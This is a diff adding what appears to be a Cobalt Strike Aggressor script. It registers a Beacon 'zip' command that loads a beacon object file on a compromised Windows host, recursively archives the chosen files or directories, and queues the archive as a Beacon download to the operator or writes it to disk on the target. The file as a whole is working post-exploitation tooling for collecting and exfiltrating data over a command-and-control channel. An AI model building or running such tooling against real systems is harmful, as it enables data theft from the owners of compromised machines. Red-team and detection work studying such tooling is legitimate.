@@ -1,0 +1,86 @@
+beacon_command_register(
+    "zip",
+    "Create a ZIP archive and download it or save it on the target",
+
+    "Build a ZIP archive in Beacon memory and queue it as a Beacon download. " .
+    "With --disk, write the archive to a path on the target instead.\n\n" .
+    "Usage:\n" .
+    "  zip <source> <destination.zip> [level 0-9] [--disk]\n\n" .
+    "Arguments:\n" .
+    "  source           File or directory to archive; directories are " .
+    "archived recursively\n" .
+    "  destination.zip  Download name, or a path on the target with --disk\n" .
+    "  level            Compression level from 0 to 9 (default: 6)\n\n" .
+    "Options:\n" .
+    "  --disk           Write the archive to the target; it replaces the " .
+    "destination only after the archive is built\n\n" .
+    "Without --disk, the source may contain at most 64 MiB and 100,000 " .
+    "entries; use --disk for larger sources. Symbolic links and other " .
+    "reparse points are skipped.\n\n" .
+    "Relative, drive (C:\\...), and UNC (\\\\server\\share\\...) paths " .
+    "are supported, including non-ASCII names. Drive-relative (C:file), " .
+    "root-relative (\\file), and device (\\\\?\\, \\\\.\\) paths are " .
+    "rejected. Quote paths that contain spaces.\n\n" .
+    "Examples:\n" .
+    "  zip \"C:\\Program Files\\Example\" example.zip 6\n" .
+    "  zip \"C:\\Program Files\\Example\" " .
+    "C:\\Windows\\Temp\\example.zip 6 --disk\n" .
+    "  zip \"C:\\UnicodeSamples\\café\\例\\пример.txt\" sample.zip 6\n"
+);
+
+alias zip {
+    local('$bid $source $destination $level $disk_mode $handle $bof $args $arch');
+
+    $bid = @_[0];
+    if (size(@_) < 3 || size(@_) > 5) {
+        berror($bid, "Usage: zip <source> <destination.zip> [level 0-9] [--disk]");
+        return;
+    }
+
+    $source = @_[1];
+    $destination = @_[2];
+    $level = 6;
+    $disk_mode = 0;
+
+    if (size(@_) == 4) {
+        if (@_[3] eq "--disk") {
+            $disk_mode = 1;
+        }
+        else {
+            $level = @_[3];
+        }
+    }
+    if (size(@_) == 5) {
+        $level = @_[3];
+        if (@_[4] ne "--disk") {
+            berror($bid, "Unknown option: " . @_[4]);
+            return;
+        }
+        $disk_mode = 1;
+    }
+
+    if ("$level" !in @("0", "1", "2", "3", "4", "5", "6", "7", "8", "9")) {
+        berror($bid, "Compression level must be between 0 and 9.");
+        return;
+    }
+    $arch = barch($bid);
+    if ($arch ne "x64" && $arch ne "x86") {
+        berror($bid, "Zip BOF supports x86 and x64 Beacons only.");
+        return;
+    }
+
+    $handle = openf(script_resource("zip." . $arch . ".o"));
+    $bof = readb($handle, -1);
+    closef($handle);
+
+    # Wide-string packing keeps target paths independent of the active ANSI
+    # code page. The BOF validates and consumes both values as UTF-16LE.
+    $args = bof_pack($bid, "ZZii", $source, $destination, $level, $disk_mode);
+    if ($disk_mode == 1) {
+        btask($bid, "Writing ZIP archive " . $destination . " from " . $source);
+    }
+    else {
+        btask($bid, "Creating in-memory ZIP download " . $destination . " from " . $source);
+    }
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
